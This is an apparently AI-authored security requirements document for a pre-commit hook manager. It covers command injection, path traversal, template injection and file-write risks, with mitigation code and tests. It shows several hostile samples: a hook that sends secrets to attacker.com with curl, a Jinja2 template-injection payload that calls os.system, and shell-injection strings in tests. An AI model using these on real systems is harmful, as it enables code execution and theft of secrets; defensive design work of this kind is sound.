# Security Requirements: Pre-commit Manager System

**Date:** 2026-02-14
**System:** Pre-commit Manager Skill + Enhanced Startup Hook
**Issue:** #2281
**Security Agent:** Security Assessment

## Executive Summary

The pre-commit manager system involves file I/O, command execution, and user preference storage. This document identifies security vulnerabilities and provides mandatory mitigations following the principle that **security is worth the complexity**.

**Risk Level:** MEDIUM
**Critical Vulnerabilities:** 2 (Command Injection, Path Traversal)
**High Vulnerabilities:** 3 (File Write Security, Config Validation, Template Injection)
**Medium Vulnerabilities:** 2 (Env Var Handling, Privilege Escalation)

---

## 1. Command Injection (CRITICAL)

### Risk Assessment

**Severity:** CRITICAL
**Attack Vector:** Malicious `.pre-commit-config.yaml` or environment variables reaching shell execution
**Impact:** Arbitrary code execution with user privileges

### Current Implementation Analysis

```python
# In precommit_installer.py line 284-290
result = subprocess.run(
    ["pre-commit", "install"],  # ✓ Good - list form (no shell)
    capture_output=True,
    text=True,
    timeout=30,
    cwd=self.project_root,  # ⚠️ Risk if project_root is user-controlled
)
```

**Vulnerabilities Identified:**

1. **PROTECTED**: Using list form `["pre-commit", "install"]` prevents shell injection
2. **PROTECTED**: No `shell=True` flag
3. **RISK**: `cwd` parameter could be exploited if `project_root` is not validated
4. **RISK**: No validation of `project_root` contents before passing to subprocess

### Required Mitigations

#### M1.1: Validate Working Directory (MANDATORY)

```python
def _validate_project_root(self) -> None:
    """Validate project_root is safe before using in subprocess.

    Security: Prevents directory traversal attacks via cwd parameter.
    """
    # Must be absolute path
    if not self.project_root.is_absolute():
        raise SecurityError("project_root must be absolute path")

    # Must exist and be a directory
    if not self.project_root.exists():
        raise SecurityError("project_root does not exist")

    if not self.project_root.is_dir():
        raise SecurityError("project_root is not a directory")

    # Must be within expected boundaries (no /tmp, /root, etc.)
    resolved = self.project_root.resolve()
    forbidden_dirs = [Path("/tmp"), Path("/root"), Path("/etc")]

    for forbidden in forbidden_dirs:
        if resolved == forbidden or resolved.parent == forbidden:
            raise SecurityError(f"project_root in forbidden directory: {forbidden}")
```

**Where to apply:** Call in `__init__()` before any subprocess operations

#### M1.2: Never Use shell=True (MANDATORY)

```python
# PROHIBITED PATTERN - NEVER USE
subprocess.run(f"pre-commit {command}", shell=True)  # ❌ FORBIDDEN

# REQUIRED PATTERN - ALWAYS USE
subprocess.run(["pre-commit", command], shell=False)  # ✓ SAFE
```

**Enforcement:** Add static analysis check in CI to block `shell=True`

#### M1.3: Timeout All Subprocess Calls (MANDATORY)

```python
# All subprocess.run calls MUST have timeout parameter
SUBPROCESS_TIMEOUT = 30  # seconds

result = subprocess.run(
    cmd,
    timeout=SUBPROCESS_TIMEOUT,  # MANDATORY
    capture_output=True,
    text=True,
)
```

**Rationale:** Prevents resource exhaustion attacks via hanging processes

---

## 2. Path Traversal (CRITICAL)

### Risk Assessment

**Severity:** CRITICAL
**Attack Vector:** Malicious paths in preference file or config file references
**Impact:** Read/write arbitrary files outside project directory

### Vulnerabilities Identified

```python
# Preference file storage (not yet implemented)
preference_file = Path(".claude/.precommit_preference")  # ⚠️ Relative path vulnerable

# Config file reading
config_file = self.project_root / ".pre-commit-config.yaml"  # ⚠️ No validation
```

**Attack Scenarios:**

1. **Scenario A**: Symlink `.pre-commit-config.yaml` → `/etc/passwd`
2. **Scenario B**: Preference file contains `{"config_path": "../../../../etc/passwd"}`
3. **Scenario C**: Template injection: `{{config_path}}` → malicious path

### Required Mitigations

#### M2.1: Validate All File Paths (MANDATORY)

```python
def _validate_safe_path(self, path: Path, base_dir: Path) -> Path:
    """Validate path is within base directory and not a symlink.

    Security: Prevents path traversal and symlink attacks.

    Args:
        path: Path to validate
        base_dir: Base directory path must be within

    Returns:
        Resolved absolute path

    Raises:
        SecurityError: If path is unsafe
    """
    # Resolve to absolute path (follows symlinks)
    resolved_path = path.resolve()
    resolved_base = base_dir.resolve()

    # Check if path is within base directory
    try:
        resolved_path.relative_to(resolved_base)
    except ValueError:
        raise SecurityError(
            f"Path {path} is outside base directory {base_dir}"
        )

    # Check for symlinks (optional - more restrictive)
    if path.is_symlink():
        raise SecurityError(f"Symlinks not allowed: {path}")

    return resolved_path
```

#### M2.2: Whitelist Allowed Files (MANDATORY)

```python
# Only allow these files in project root
ALLOWED_CONFIG_FILES = {
    ".pre-commit-config.yaml",
    ".claude/.precommit_preference",
}

def _validate_config_file(self, filename: str) -> Path:
    """Validate config file is in allowed list.

    Security: Whitelist approach prevents arbitrary file access.
    """
    if filename not in ALLOWED_CONFIG_FILES:
        raise SecurityError(f"Config file not allowed: {filename}")

    full_path = self.project_root / filename
    return self._validate_safe_path(full_path, self.project_root)
```

#### M2.3: Prevent Directory Traversal in Templates (MANDATORY)

```python
def _sanitize_template_path(self, template_name: str) -> str:
    """Sanitize template name to prevent directory traversal.

    Security: Blocks ../ attacks in template names.
    """
    # Remove directory separators
    sanitized = template_name.replace("/", "_").replace("\\", "_")

    # Remove parent directory references
    sanitized = sanitized.replace("..", "_")

    # Whitelist characters
    if not re.match(r'^[a-zA-Z0-9_-]+$', sanitized):
        raise SecurityError(f"Invalid template name: {template_name}")

    return sanitized
```

---

## 3. File Write Security (HIGH)

### Risk Assessment

**Severity:** HIGH
**Attack Vector:** Race conditions, permission escalation, data corruption
**Impact:** Preference data corruption, unauthorized configuration changes

### Vulnerabilities Identified

1. **Race Condition**: Multiple sessions writing preference file simultaneously
2. **Permission Issues**: World-readable preference files exposing user choices
3. **Atomic Write Failure**: Partial writes leaving corrupted state

### Required Mitigations

#### M3.1: Atomic File Writes (MANDATORY)

```python
import tempfile
import os

def _atomic_write(self, filepath: Path, content: str) -> None:
    """Write file atomically to prevent race conditions.

    Security: Prevents partial writes and race conditions.
    """
    # Validate path first
    filepath = self._validate_safe_path(filepath, self.project_root)

    # Create temp file in same directory (same filesystem)
    temp_fd, temp_path = tempfile.mkstemp(
        dir=filepath.parent,
        prefix=f".{filepath.name}.",
        suffix=".tmp"
    )

    try:
        # Write to temp file with restricted permissions
        os.chmod(temp_path, 0o600)  # Owner read/write only

        with os.fdopen(temp_fd, 'w') as f:
            f.write(content)
            f.flush()
            os.fsync(f.fileno())  # Force to disk

        # Atomic rename
        os.replace(temp_path, filepath)

    except Exception as e:
        # Clean up temp file on error
        try:
            os.unlink(temp_path)
        except OSError:
            pass
        raise IOError(f"Failed to write {filepath}: {e}")
```

#### M3.2: Secure File Permissions (MANDATORY)

```python
# After any file creation
SECURE_FILE_PERMS = 0o600  # Owner read/write only
SECURE_DIR_PERMS = 0o700   # Owner all permissions only

def _ensure_secure_permissions(self, path: Path) -> None:
    """Ensure file/directory has secure permissions.

    Security: Prevents other users from reading user preferences.
    """
    if path.is_file():
        path.chmod(SECURE_FILE_PERMS)
    elif path.is_dir():
        path.chmod(SECURE_DIR_PERMS)
```

#### M3.3: File Locking for Concurrent Access (MANDATORY)

```python
import fcntl

def _locked_read(self, filepath: Path) -> str:
    """Read file with shared lock.

    Security: Prevents reading during writes.
    """
    with open(filepath, 'r') as f:
        fcntl.flock(f.fileno(), fcntl.LOCK_SH)  # Shared lock
        try:
            return f.read()
        finally:
            fcntl.flock(f.fileno(), fcntl.LOCK_UN)

def _locked_write(self, filepath: Path, content: str) -> None:
    """Write file with exclusive lock.

    Security: Prevents concurrent writes.
    """
    with open(filepath, 'w') as f:
        fcntl.flock(f.fileno(), fcntl.LOCK_EX)  # Exclusive lock
        try:
            f.write(content)
            f.flush()
            os.fsync(f.fileno())
        finally:
            fcntl.flock(f.fileno(), fcntl.LOCK_UN)
```

---

## 4. Configuration Validation (HIGH)

### Risk Assessment

**Severity:** HIGH
**Attack Vector:** Malicious `.pre-commit-config.yaml` with code execution hooks
**Impact:** Arbitrary code execution during hook runs

### Vulnerabilities Identified

```yaml
# Malicious config example
repos:
  - repo: local
    hooks:
      - id: malicious
        name: Exfiltrate secrets
        entry: curl -X POST attacker.com --data-binary @secrets.txt
        language: system
        pass_filenames: false
```

**Note:** pre-commit INTENTIONALLY allows arbitrary command execution - this is a feature, not a bug. Our security boundary is ensuring users understand what they're installing.

### Required Mitigations

#### M4.1: Config Schema Validation (MANDATORY)

```python
import yaml
from typing import Any, Dict

def _validate_precommit_config(self, config_path: Path) -> Dict[str, Any]:
    """Validate .pre-commit-config.yaml structure.

    Security: Ensures config is well-formed YAML before installation.
    Note: We do NOT validate hook commands - that's user responsibility.
    """
    try:
        with open(config_path, 'r') as f:
            config = yaml.safe_load(f)  # ✓ safe_load prevents code execution
    except yaml.YAMLError as e:
        raise ValidationError(f"Invalid YAML: {e}")

    # Validate required structure
    if not isinstance(config, dict):
        raise ValidationError("Config must be YAML dict")

    if 'repos' not in config:
        raise ValidationError("Config must have 'repos' key")

    if not isinstance(config['repos'], list):
        raise ValidationError("'repos' must be a list")

    # DO NOT validate hook commands - pre-commit is designed to run arbitrary code
    # Users are responsible for reviewing configs before installation

    return config
```

#### M4.2: User Confirmation for Installation (MANDATORY)

```python
def _confirm_installation(self, config_path: Path) -> bool:
    """Prompt user to review config before installation.

    Security: Ensures user awareness of what will be installed.
    """
    config = self._validate_precommit_config(config_path)

    print("\n⚠️  Pre-commit hooks will execute code on every commit")
    print(f"Config: {config_path}")
    print(f"Repos: {len(config['repos'])}")

    # Show repo sources
    for i, repo in enumerate(config['repos'], 1):
        repo_url = repo.get('repo', 'local')
        print(f"  {i}. {repo_url}")

    print("\n📖 Review config before proceeding:")
    print(f"   cat {config_path}")

    response = input("\nInstall these hooks? [y/N]: ")
    return response.lower() in ('y', 'yes')
```

**When to apply:** Only for NEW installations, not for auto-reinstall of existing hooks

#### M4.3: Log Hook Installations (MANDATORY)

```python
def _log_installation(self, config_path: Path) -> None:
    """Log hook installation for audit trail.

    Security: Provides audit trail of what was installed when.
    """
    log_file = self.project_root / ".claude" / "runtime" / "logs" / "precommit_installs.log"
    log_file.parent.mkdir(parents=True, exist_ok=True)

    timestamp = datetime.now().isoformat()
    config_hash = hashlib.sha256(config_path.read_bytes()).hexdigest()[:8]

    log_entry = f"{timestamp} | Installed | config_hash={config_hash}\n"

    with open(log_file, 'a') as f:
        f.write(log_entry)
```

---

## 5. Template Injection (HIGH)

### Risk Assessment

**Severity:** HIGH
**Attack Vector:** Malicious template files with code execution payloads
**Impact:** Arbitrary code execution during config generation

### Vulnerabilities Identified

```python
# Vulnerable Jinja2 template (EXAMPLE OF WHAT TO AVOID)
from jinja2 import Template

template_str = config_file.read_text()  # ⚠️ User-controlled
template = Template(template_str)  # ⚠️ Allows {{ }} execution
result = template.render(user_data)  # ⚠️ Code execution
```

**Attack payload in template:**

```yaml
repos:
  - repo: {{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('malicious') }}
```

### Required Mitigations

#### M5.1: Use Safe Template Engine (MANDATORY)

```python
from string import Template  # ✓ Safe - only $var substitution

def _render_template(self, template_path: Path, variables: Dict[str, str]) -> str:
    """Render template safely using string.Template.

    Security: string.Template does NOT allow code execution.
    """
    # Validate template path
    template_path = self._validate_safe_path(template_path, self.templates_dir)

    # Read template
    template_str = template_path.read_text()

    # Use string.Template (safe - no code execution)
    template = Template(template_str)

    # Validate all variables are strings
    for key, value in variables.items():
        if not isinstance(value, str):
            raise ValueError(f"Template variable must be string: {key}")

    # Render (safe substitution only)
    return template.safe_substitute(variables)  # safe_substitute won't raise on missing
```

#### M5.2: Whitelist Template Variables (MANDATORY)

```python
# Only allow these variables in templates
ALLOWED_TEMPLATE_VARS = {
    'project_name',
    'python_version',
    'author_email',
}

def _validate_template_vars(self, variables: Dict[str, str]) -> None:
    """Validate template variables are in whitelist.

    Security: Prevents injection via unexpected variables.
    """
    for key in variables:
        if key not in ALLOWED_TEMPLATE_VARS:
            raise SecurityError(f"Template variable not allowed: {key}")

        # Validate value contains no control characters
        if not all(c.isprintable() or c.isspace() for c in variables[key]):
            raise SecurityError(f"Template variable contains invalid characters: {key}")
```

#### M5.3: Never Use Jinja2 with User Content (MANDATORY)

```python
# PROHIBITED - Jinja2 allows code execution
from jinja2 import Template  # ❌ FORBIDDEN for user content

# REQUIRED - string.Template is safe
from string import Template  # ✓ REQUIRED for user content
```

---

## 6. Environment Variable Injection (MEDIUM)

### Risk Assessment

**Severity:** MEDIUM
**Attack Vector:** Malicious environment variables affecting subprocess behavior
**Impact:** Modified command execution, information disclosure

### Vulnerabilities Identified

```python
# Current code reads env var without validation
env_value = os.environ.get("AMPLIHACK_AUTO_PRECOMMIT", "").lower()  # ⚠️ Unvalidated
```

**Attack vectors:**

- `AMPLIHACK_AUTO_PRECOMMIT="'; malicious_command; #"`
- `AMPLIHACK_AUTO_PRECOMMIT="$(command)"`

### Required Mitigations

#### M6.1: Whitelist Environment Variable Values (MANDATORY)

```python
# Allowed values for AMPLIHACK_AUTO_PRECOMMIT
ALLOWED_ENV_VALUES = {"0", "1", "false", "true", "no", "yes", "off", "on"}

def _validate_env_var(self, var_name: str) -> str:
    """Validate environment variable value.

    Security: Prevents injection via environment variables.
    """
    value = os.environ.get(var_name, "").lower().strip()

    if value and value not in ALLOWED_ENV_VALUES:
        self.log(f"Invalid value for {var_name}: {value}", "WARNING")
        return ""  # Treat invalid as unset

    return value
```

#### M6.2: Never Pass Env Vars to Shell (MANDATORY)

```python
# PROHIBITED - env var reaches shell
subprocess.run(f"command {os.environ['VAR']}", shell=True)  # ❌ FORBIDDEN

# REQUIRED - env var isolated from shell
subprocess.run(["command", os.environ['VAR']], shell=False)  # ✓ SAFE
```

---

## 7. Privilege Escalation (MEDIUM)

### Risk Assessment

**Severity:** MEDIUM
**Attack Vector:** Hook runs at session start with elevated context
**Impact:** Unintended operations in critical directories

### Vulnerabilities Identified

1. **Session Start Execution**: Hook runs automatically before user interaction
2. **Working Directory**: Could be `/root`, `/etc`, or other sensitive locations
3. **No User Approval**: Auto-installs without confirmation (by design)

### Required Mitigations

#### M7.1: Forbidden Directory Checks (MANDATORY)

```python
# Directories where hook should NEVER run
FORBIDDEN_DIRECTORIES = {
    Path("/root"),
    Path("/etc"),
    Path("/usr"),
    Path("/bin"),
    Path("/sbin"),
    Path("/tmp"),
    Path("/var"),
}

def _check_forbidden_directory(self) -> bool:
    """Check if current directory is forbidden for hook operations.

    Security: Prevents operations in system directories.
    """
    resolved = self.project_root.resolve()

    for forbidden in FORBIDDEN_DIRECTORIES:
        # Check if current dir is forbidden or within forbidden
        try:
            resolved.relative_to(forbidden)
            self.log(f"Refusing to operate in forbidden directory: {forbidden}", "ERROR")
            return True
        except ValueError:
            continue  # Not in this forbidden dir

    return False
```

#### M7.2: Git Repository Validation (MANDATORY)

```python
def _validate_git_repo(self) -> bool:
    """Validate current directory is a safe git repository.

    Security: Ensures we're in a user project, not a system directory.
    """
    git_dir = self.project_root / ".git"

    # Must have .git directory
    if not git_dir.exists():
        return False

    # .git must be a directory (not a file pointing elsewhere)
    if not git_dir.is_dir():
        self.log(".git is not a directory (worktree?)", "WARNING")
        # Still allow - worktrees are legitimate

    # Check if .git/config exists and is readable
    git_config = git_dir / "config"
    if not git_config.exists():
        self.log("Invalid git repository - no .git/config", "ERROR")
        return False

    return True
```

---

## 8. Input Validation Requirements

### Mandatory Validation Rules

All user inputs MUST be validated before use:

#### R8.1: Preference File Content

```python
import json

def _validate_preference_content(self, content: str) -> Dict[str, str]:
    """Validate preference file content.

    Security: Ensures preference file contains only expected data.
    """
    try:
        data = json.loads(content)
    except json.JSONDecodeError as e:
        raise ValidationError(f"Invalid JSON in preference file: {e}")

    if not isinstance(data, dict):
        raise ValidationError("Preference file must contain JSON object")

    # Whitelist allowed keys
    allowed_keys = {"auto_install", "last_prompt", "version"}
    for key in data:
        if key not in allowed_keys:
            raise ValidationError(f"Unknown preference key: {key}")

    # Validate values
    if "auto_install" in data:
        allowed = {"always", "never", "ask"}
        if data["auto_install"] not in allowed:
            raise ValidationError(f"Invalid auto_install value: {data['auto_install']}")

    return data
```

#### R8.2: Template Names

```python
def _validate_template_name(self, name: str) -> str:
    """Validate template name.

    Security: Prevents directory traversal in template names.
    """
    # Remove any path components
    name = Path(name).name  # Gets filename only

    # Whitelist characters
    if not re.match(r'^[a-zA-Z0-9_-]+\.yaml$', name):
        raise ValidationError(f"Invalid template name: {name}")

    # Check length
    if len(name) > 64:
        raise ValidationError(f"Template name too long: {name}")

    return name
```

---

## 9. Safe Defaults and Fail-Secure Patterns

### Security-First Defaults

```python
class PrecommitManagerDefaults:
    """Security-first default values."""

    # Deny by default
    AUTO_INSTALL = "ask"  # Never auto-install without user awareness

    # Restrictive permissions
    FILE_PERMS = 0o600
    DIR_PERMS = 0o700

    # Timeouts
    SUBPROCESS_TIMEOUT = 30
    FILE_LOCK_TIMEOUT = 5

    # Limits
    MAX_CONFIG_SIZE = 1024 * 1024  # 1MB
    MAX_TEMPLATE_SIZE = 64 * 1024  # 64KB
    MAX_PREFERENCE_SIZE = 4096     # 4KB
```

### Fail-Secure Error Handling

```python
def _safe_operation(self) -> bool:
    """Template for fail-secure operations.

    Security: Always fail to secure state, never fail open.
    """
    try:
        # Attempt operation
        result = self._risky_operation()
        return result

    except SecurityError as e:
        # Security violations always fail
        self.log(f"Security violation: {e}", "ERROR")
        return False  # FAIL SECURE

    except Exception as e:
        # Unknown errors fail secure
        self.log(f"Operation failed: {e}", "ERROR")
        return False  # FAIL SECURE
```

---

## 10. Testing Requirements for Security

### Security Test Categories

#### T10.1: Command Injection Tests (MANDATORY)

```python
def test_command_injection_via_cwd():
    """Test that malicious cwd doesn't enable command injection."""
    hook = PrecommitInstallerHook()
    hook.project_root = Path("/tmp/$(whoami)")  # Injection attempt

    with pytest.raises(SecurityError):
        hook._install_hooks()

def test_command_injection_via_config():
    """Test that malicious config path doesn't enable command injection."""
    hook = PrecommitInstallerHook()
    malicious_config = "config; rm -rf /"

    with pytest.raises(SecurityError):
        hook._validate_config_file(malicious_config)
```

#### T10.2: Path Traversal Tests (MANDATORY)

```python
def test_path_traversal_in_preference_file():
    """Test that ../ in paths is blocked."""
    hook = PrecommitInstallerHook()

    with pytest.raises(SecurityError):
        hook._validate_safe_path(
            Path(".claude/../../etc/passwd"),
            hook.project_root
        )

def test_symlink_attack():
    """Test that symlinks are not followed outside project."""
    # Create symlink to /etc/passwd
    link = tmpdir / ".pre-commit-config.yaml"
    link.symlink_to("/etc/passwd")

    with pytest.raises(SecurityError):
        hook._validate_config_file(".pre-commit-config.yaml")
```

#### T10.3: File Permission Tests (MANDATORY)

```python
def test_preference_file_permissions():
    """Test that preference file has secure permissions."""
    hook = PrecommitInstallerHook()
    pref_file = tmpdir / ".claude" / ".precommit_preference"

    hook._save_preference("always")

    # Check permissions are 0o600
    stat_info = pref_file.stat()
    assert stat.S_IMODE(stat_info.st_mode) == 0o600
```

#### T10.4: Input Validation Tests (MANDATORY)

```python
def test_malicious_env_var():
    """Test that malicious env var values are rejected."""
    with patch.dict(os.environ, {"AMPLIHACK_AUTO_PRECOMMIT": "'; echo pwned; '"}):
        hook = PrecommitInstallerHook()
        # Should treat as disabled (invalid value)
        assert not hook._is_env_disabled()

def test_oversized_config():
    """Test that oversized configs are rejected."""
    huge_config = "a" * (2 * 1024 * 1024)  # 2MB

    with pytest.raises(ValidationError):
        hook._validate_config_size(huge_config)
```

---

## 11. Security Checklist for Implementation

### Pre-Implementation (Designer/Architect)

- [ ] All file paths validated before use
- [ ] subprocess calls use list form (no shell=True)
- [ ] Timeouts set on all subprocess calls
- [ ] File permissions set to 0o600/0o700
- [ ] Atomic writes used for all file modifications
- [ ] Environment variables validated before use
- [ ] Templates use string.Template (not Jinja2)
- [ ] Forbidden directories checked
- [ ] User confirmation for new installations
- [ ] Audit logging implemented

### Implementation (Builder)

- [ ] Input validation on all external data
- [ ] Whitelist approach for allowed values
- [ ] Error messages don't leak sensitive info
- [ ] Secrets never logged
- [ ] Race conditions prevented (file locking)
- [ ] Symlinks detected and blocked
- [ ] Config size limits enforced
- [ ] Fail-secure error handling

### Testing (Tester)

- [ ] Command injection tests pass
- [ ] Path traversal tests pass
- [ ] Permission tests pass
- [ ] Input validation tests pass
- [ ] Race condition tests pass
- [ ] Fuzzing tests pass (malformed inputs)
- [ ] Security regression tests included

### Review (Reviewer)

- [ ] No shell=True in code
- [ ] No Jinja2 with user content
- [ ] All paths validated
- [ ] All subprocess calls have timeouts
- [ ] File permissions correct (0o600/0o700)
- [ ] No secrets in logs or error messages
- [ ] Fail-secure error handling verified

---

## 12. Security Monitoring and Metrics

### Metrics to Track

```python
# Security-relevant metrics
SECURITY_METRICS = {
    "security_violations": 0,      # Number of security checks that failed
    "forbidden_dir_blocks": 0,     # Attempts to operate in forbidden dirs
    "path_traversal_blocks": 0,    # Blocked path traversal attempts
    "invalid_env_vars": 0,         # Invalid environment variable values
    "file_permission_fixes": 0,    # Files with incorrect permissions fixed
}
```

### Audit Log Format

```
# .claude/runtime/logs/security_audit.log
2026-02-14T10:30:45 | BLOCK | path_traversal | file=../../etc/passwd
2026-02-14T10:31:12 | BLOCK | forbidden_dir | dir=/root
2026-02-14T10:32:05 | ALLOW | install_hooks | config_hash=a3f42e9c
```

---

## 13. Security Principles Applied

Following @PHILOSOPHY.md "Areas to Embrace Complexity":

### Principle 1: Never Compromise Security Fundamentals

- Command injection prevention: List-form subprocess calls
- Path traversal prevention: Path validation before use
- Atomic writes: Prevent race conditions and corruption

### Principle 2: Defense in Depth

- Multiple layers: Input validation → Path validation → Subprocess isolation
- Fail-secure: Errors default to denying access
- Audit logging: Track security-relevant events

### Principle 3: Principle of Least Privilege

- File permissions: 0o600 (owner-only)
- Directory permissions: 0o700 (owner-only)
- No unnecessary capabilities

### Principle 4: Fail Secure

- Unknown states → Deny access
- Validation failures → Reject operation
- Errors → Log and stop (don't continue)

---

## 14. References and Standards

### Security Patterns from PATTERNS.md

- **Safe Subprocess Wrapper**: Pattern for subprocess with comprehensive error handling
- **Fail-Fast Prerequisite Checking**: Validate before operations
- **File I/O with Cloud Sync Resilience**: Atomic writes with retries
- **Secure Defaults**: Deny by default, explicit allow

### External Standards

- **OWASP Top 10**: Command injection (#1), Path traversal (in A01:2021)
- **CWE-78**: OS Command Injection
- **CWE-22**: Path Traversal
- **CWE-362**: Race Condition
- **PEP 440**: Version parsing (for future use)

---

## 15. Security Review Sign-off

### Required Approvals

- [ ] Security Agent: Architecture reviewed and approved
- [ ] Builder Agent: Implementation follows security requirements
- [ ] Tester Agent: All security tests pass
- [ ] Reviewer Agent: Code review confirms compliance
- [ ] Human: Final approval before merge

### Sign-off Criteria

1. All CRITICAL and HIGH vulnerabilities mitigated
2. All MANDATORY mitigations implemented
3. All security tests passing
4. No shell=True in codebase
5. All file operations use validated paths
6. Audit logging operational

---

## Appendix A: Quick Reference

### Command Execution Security

```python
# ✓ SAFE
subprocess.run(["pre-commit", "install"], timeout=30, shell=False)

# ❌ UNSAFE
subprocess.run("pre-commit install", shell=True)
subprocess.run(f"pre-commit {cmd}", shell=True)
```

### Path Validation Security

```python
# ✓ SAFE
path = self._validate_safe_path(user_path, self.project_root)

# ❌ UNSAFE
path = self.project_root / user_path  # No validation
```

### File Write Security

```python
# ✓ SAFE
self._atomic_write(filepath, content)
filepath.chmod(0o600)

# ❌ UNSAFE
filepath.write_text(content)  # No atomic, no permissions
```

### Template Security

```python
# ✓ SAFE
from string import Template
template = Template(template_str)

# ❌ UNSAFE
from jinja2 import Template
template = Template(template_str)
```

---

**Document Version:** 1.0
**Last Updated:** 2026-02-14
**Next Review:** Before implementation (Step 8)
